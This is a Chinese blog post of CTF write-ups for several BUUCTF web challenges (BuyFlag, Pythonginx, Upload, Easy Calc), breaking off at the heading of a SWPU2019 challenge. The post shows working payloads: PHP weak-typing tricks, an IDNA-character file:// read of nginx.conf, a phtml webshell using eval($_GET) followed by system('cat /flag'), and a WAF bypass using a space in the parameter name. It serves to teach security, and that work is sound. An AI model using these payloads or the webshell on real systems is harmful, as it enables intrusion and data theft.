<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="ctf," />










<meta name="description" content="之所以新开一篇文来写wp是因为之前的那篇文引用了太多图片了。如果不分开来的话一下子同时请求那么多图片会把服务器炸掉。所以想了想还是分开来写吧，也有利于访问。 web[极客大挑战 2019]BuyFlag知识点  弱类型 cookie修改   进去后找到一个pay.php的页面。毕竟要买flag嘛。不过没看到怎么传参，于是翻源码看了看。果然发现了 1234567891011&amp;lt;!--	~~~po">
<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf-wp2">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;16&#x2F;buuctf-wp2&#x2F;index.html">
<meta property="og:site_name" content="irrik&#39;s Blog">
<meta property="og:description" content="之所以新开一篇文来写wp是因为之前的那篇文引用了太多图片了。如果不分开来的话一下子同时请求那么多图片会把服务器炸掉。所以想了想还是分开来写吧，也有利于访问。 web[极客大挑战 2019]BuyFlag知识点  弱类型 cookie修改   进去后找到一个pay.php的页面。毕竟要买flag嘛。不过没看到怎么传参，于是翻源码看了看。果然发现了 1234567891011&amp;lt;!--	~~~po">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;16&#x2F;4udOJIDZQTzWR6r.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;16&#x2F;yc4PQAROS2dfiKh.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;16&#x2F;G5nj2AxcpqitDTS.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;18&#x2F;W3HjeiudgzLbXw1.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;18&#x2F;ZrQqilfyOhMU3TP.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;18&#x2F;3OVdtqzQMbnWsBF.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;18&#x2F;3IalFmNLZo7QTSq.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;19&#x2F;WHfbrG5ApXNmjzo.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;20&#x2F;agexpPtLRQFUOfk.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;20&#x2F;ElO7BwjL4gZzMr8.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;20&#x2F;tgLFQa6e8mVWoqk.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;20&#x2F;Mh1YilPHmKJXnCc.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;20&#x2F;Tqyj2OCtoZbJfUV.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;31&#x2F;y5efRlmPvXzHpi1.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;31&#x2F;CZ1pPRLsS4FwGbi.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;31&#x2F;ITDky1JYZ2Sp4qn.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;01&#x2F;coDd3ezvjNaQhxJ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;01&#x2F;o5jQZinNrxwfkpE.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;01&#x2F;ZhsaNRFM3ID8t6x.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;WFluOpXry5Ye9sj.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;7MiG5zefUm2bx6X.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;cf2sup4GjtRnbmT.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;byvhGLkxuYN9Bz1.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;oDxdjBH5Av8iCW6.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;02&#x2F;E4XQP6YBabNhMSJ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;03&#x2F;kuI8YZRcis9Db52.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;07&#x2F;xs3hLwOQ2crM9VX.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;09&#x2F;PeyYIzQpFHl8R1O.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;09&#x2F;9qYCM4JLuDmrlIi.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;YFPaVd1tybumqQZ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;Cq9ISfR3t4aogAn.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;6xYLeatDQV4JiGZ.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;FSGUxThAVdIBJyj.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;NHmWGxzOKVc3uI5.png">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;10&#x2F;9gbA5sZU3SfoBHC.png">
<meta property="og:updated_time" content="2020-04-10T13:45:38.058Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;03&#x2F;16&#x2F;4udOJIDZQTzWR6r.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/03/16/buuctf-wp2/"/>





  <title>buuctf-wp2 | irrik's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">irrik's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">夏天要过去了</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/16/buuctf-wp2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="irrik">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="irrik's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">buuctf-wp2</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T07:27:17+08:00">
                2020-03-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  27.8k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  121
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>之所以新开一篇文来写wp是因为之前的那篇文引用了太多图片了。<br>如果不分开来的话一下子同时请求那么多图片会把服务器炸掉。<br>所以想了想还是分开来写吧，也有利于访问。</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>知识点</p>
<ul>
<li>弱类型</li>
<li>cookie修改</li>
</ul>
<hr>
<p>进去后找到一个pay.php的页面。<br>毕竟要买flag嘛。不过没看到怎么传参，于是翻源码看了看。<br>果然发现了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	$password = $_POST[&apos;password&apos;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>在本页还提示了要买flag必须是来自CUIT的学生。估计是要加个referer的意思吧。<br>分析一下这断源码的意思，首先对$password进行了检查，要过is_nemeric还是很容易的，<br>这个函数只有在检查目标是数字，或者纯数字字符串的时候才返回真。考虑到后面的弱类型比较，这里可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">404a</span><br><span class="line">404%20</span><br></pre></td></tr></table></figure>
<p>这类payload过is_numeric并且使后面的弱相等比较为真。<br>这里扩展讲一下php的数字和字符串比较原则。<br><strong>当一个数字和字符串弱相等比较的时候，会尝试把字符串转换成数字来比较</strong></p>
<ul>
<li>字符串是digital+alpha形式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">888 == &quot;888a&quot; //true</span><br><span class="line">88 == &quot;8a8&quot; //false</span><br><span class="line">8 == &quot;8a8&quot; // true</span><br><span class="line">888 == &quot;a888&quot;//false</span><br><span class="line">0 == &quot;a888&quot; // true</span><br></pre></td></tr></table></figure>
可以看到此时只会截取第一个非数字字符前面的数字转换比较。如果第一个字符就是非数字字符会返回0.</li>
<li>alpha+digital形式<br>这种字母打头的形式在弱相等和数字比较会被转为0</li>
<li>digital+alpha+digital形式<br>这种形式的字符串只会被截取第一个非数字字符前的数字来转换<br>例如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;88a88&quot; == 88 //true</span><br><span class="line">&quot;9a88&quot; == 9 //true</span><br></pre></td></tr></table></figure></li>
<li>alpha+digital+alpha形式<br>这种形式也是会被转为0.</li>
</ul>
<hr>
<p>扩展了一下弱类型比较，填一下password和money，加了referer，直接post上去看看效果<br>发现居然没反应。再仔细检查一遍变量名，没错。<br>然后检查header头，发现cookie里有个user=0。把这里改为1试试。postman好像没法改这东西。<br>又拿出了bp。<br><img src="https://i.loli.net/2020/03/16/4udOJIDZQTzWR6r.png" alt="Snipaste_2020-03-16_07-52-46.png"><br>这样打上去提示money的长度太长了。估计后端有长度限制。<br>这时候可以试试科学计数法绕过<br><code>money=1e10</code><br>果然成功拿到flag</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本题主要考察弱类型<br>虽然不难但是还是学到了。以前一直对这个弱类型不太熟。<br>碰到这道题才算是真正去查去总结了。顺带还学了个科学计数法绕过数字长度限制的小tip。<br>有点小坑的地方就是cookie那里了。不过也不是什么大事。本题试了下和referer也没啥关系。<br>有学到东西，谢谢招待。</p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>知识点</p>
<ul>
<li>python出过的urllib下 urlsplit和urlparse两个函数的洞。</li>
<li>nginx的基础知识</li>
</ul>
<hr>
<p>进去就给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1]</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&apos;.&apos;):</span><br><span class="line">        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))</span><br><span class="line">    parts[1] = &apos;.&apos;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host == &apos;suctf.cc&apos;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>
<p>看了一下大概的意思，是让我们想办法访问suctf.cc。<br>但是前面应该都是过滤了这个域名才对。估计是urlparse或者urlsplit这两函数有猫腻。<br>直接一搜urlsplit ctf。嗯。。直接给搜到了原题。<br>这篇文章讲得很好，确实有学到，谢过大佬<a href="https://zhuanlan.zhihu.com/p/104885386" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/03/16/yc4PQAROS2dfiKh.png" alt="Snipaste_2020-03-16_17-37-47.png"><br>本题主要用的是urlsplit的漏洞绕过验证然后访问网站。这里还提到了nginx。因为能访问了你还要找一下flag在哪对吧。<br><img src="https://i.loli.net/2020/03/16/G5nj2AxcpqitDTS.png" alt="Snipaste_2020-03-16_17-43-47.png"><br>nginx配置文件目录为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>先把找到的特殊字符放一下(我都不懂这叫什么字符)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">℀ ℁ ℅ ℆ ⅍</span><br></pre></td></tr></table></figure>
<p>这里要说一下urllib.request.urlopen()这个函数能够打开不同协议的url(http,https,file,ftp等)<br>这里有个file协议读取本地文件，看看是个什么东西<br>基本格式：file:///文件路径。如果是域名就只有两个斜线。本题应该是增加了对域名的解析(个人理解不一定对)<br>然后通过这里去到根目录下读取文件，http(s)是读不到除了web根目录下以外的东西的(个人理解不一定对)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>里边说到了flag所在，，<br>构造payload去读flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>感谢大表哥出的题，又学到新知识了。除了这个编码处理不正确的问题外。<br>另外的一些nginx的文件知识啊，file协议啊。也是挺有用的。<br>谢谢招待</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>知识点</p>
<ul>
<li>apache解析漏洞</li>
<li><code>&lt;script language=&quot;php&gt;&lt;\script&gt;</code>的方式执行php代码</li>
</ul>
<hr>
<p>这道题非常直接，进去就是一个upload界面。<br>尝试上传正常的jpg文件，居然提示not！image。我人有点傻了。<br>试了几下想着还是直接扫后台看看有没有什么门路<br>扫到了upload这个文件夹。<br>随便输入一个不存在的路径，报错了。<br>后端服务器是apache2.4.7版本。<br>访问/upload一看，确实可以上传jpg和php。<br>我自己试了php5，php3，php4和pht发现没绕过去，竟然没去试离成功只有一步之遥的phtml.<br>还尝试了irrik.php.test，发现也不能成功解析。我到这里感觉不是解析漏洞了呢(懒狗之伤)<br>想着会不会是要上传一个.htaccess文件。<br>屁颠屁颠跑去弄了一个文件然后上传。上传的时候还是伪造一下图片文件头GIF98a就行。<br>改一下mime头。提示上传成功！给我激动的。<br>马上去upload目录看看成功了没有。嗯？居然没有，反复几次之后我人傻了。<br>又看到目录下有别人上传好的php文件。想着要不上传个.user.ini文件试试。<br>同样构造图片头和改mime。提示上传成功了。屁颠屁颠跑去目录一看。得，又被骗了。<br>想过的点都试了，没效果。看wp去了。<br>一看，嗯？phtml绕过。表哥就是表哥。过滤故意放口子，学到了。<br>最后上传一个irrik.phtml文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[&apos;irrik&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>直接访问然后传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?irrik=system(&apos;ls /&apos;);</span><br><span class="line">?irrik=system(&apos;cat /flag&apos;);</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这道题，怎么说呢。也不是自己没想到点上。还是自己太懒了。<br>解析漏洞没试完全。警醒一下自己，以后这种测试别偷懒放过漏网之鱼吧。</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>知识点</p>
<ul>
<li>php参数解析特性</li>
<li>scandir函数</li>
</ul>
<hr>
<p>这道题进去是一个输入框。题目是计算器嘛，就输入1+1看看。返回了2.<br>基本可以猜测后端语句是eval(‘echo ‘ . $param . ‘;’);<br>试试看数学函数可用吗，exp()，不行。后面试了一下应该是过滤了所有字母。<br>输入’,^的时候提示what u want to do.应该也是过滤了。<br>ctrl+u看源码。发现提示了waf。后端访问的url也给出来了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2931-fc1004d9-b2c9-4630-9dec-bb1d073a10a1node3.buuoj.cn:26417/calc.php?num=1</span><br></pre></td></tr></table></figure>
<p>一看过滤了所有字母，还过滤了’,^之类的，取反异或啥的好像都不行了，没招了。<br>看wp。</p>
<hr>
<p>表哥们就是强，一看又学到了。首先引用一下大佬的见解：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">传送门</a></p>
<blockquote>
<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br><span class="line"></span><br><span class="line">上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中</span><br></pre></td></tr></table></figure>
<p>php在解析参数名的时候，会做两件事。</p>
<ul>
<li>删除空白符</li>
<li>将某些字符转换为下划线(包括空格,点号)</li>
</ul>
<p>回到题目。这道题直接访问<a href="http://2931-fc1004d9-b2c9-4630-9dec-bb1d073a10a1node3.buuoj.cn:26417/calc.php是会有源码的。。" target="_blank" rel="noopener">http://2931-fc1004d9-b2c9-4630-9dec-bb1d073a10a1node3.buuoj.cn:26417/calc.php是会有源码的。。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到并没有过滤字母，这应该是waf的工作。<br>仔细看看刚才那篇好文就知道。如果waf设置的时候检查的变量是num,那我们可以用 num来绕过(注意这里是 num,有个空格的)<br>这样就可以过waf(至少本题可以了),然而php在解析这个参数名的时候会去掉空字符，所以最终$_GET数组里的参数名会变成num。不影响代码执行。<br>但是已经可以过waf了。尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=phpinfo();</span><br></pre></td></tr></table></figure>
<p>已经成功过了waf执行了phpinfo函数。<br>虽然已经过了waf，但是本题还是过滤了不少符号。直接system(‘ls /‘);这样是不用想了。</p>
<hr>
<p>接下来就是想办法读数据了。这里我有点奇怪为什么不能用system()函数而每个wp都写了用scandir这个函数。<br>先看卡scandir函数吧。介绍是这样的</p>
<ul>
<li>列出指定路径中的文件和目录。<br>返回的数据是一个数组。大家的wp里都写了var_dump(scandir(chr(47)))的字样。<br>试了一下，去掉var_dump的话确实不会展开数组里的内容。<br>而var_dump这个函数就有这个功能，如果参数是数组，会递归展开值，通过缩进来显示结构。<br>我本地试了一下echo $a;($a是数组)，确实不会展开里面的内容。那需要var_dump这一步就理解了。<br>本地还测试了一下。在我本地用system(‘ls /‘)列举不出来的内容用scandir(‘/‘)居然列举出来了。。(windows)<br>发现flag在根目录下文件flagg里面<br>这里我也疑惑为什么不能用system(‘cat /flagg’)的chr编码形式。这道题应该就是这里理解不能了。<br>大伙都用了这个payload。虽然能够理解下面这个payload。但是还是不知道为啥不能system形式来读取。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3>这道题还是学到了东西的。比如过waf的技巧。php解析查询字符串的特性。<br>还知道了scandir函数。同时对var_dump函数的使用也多了一个用途(展开数组)。<br>除了system函数不知为啥用不了之外。<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2>知识点</li>
<li>无列名注入</li>
<li>获取表名的奇妙方式(非information_schema)</li>
</ul>
<hr>
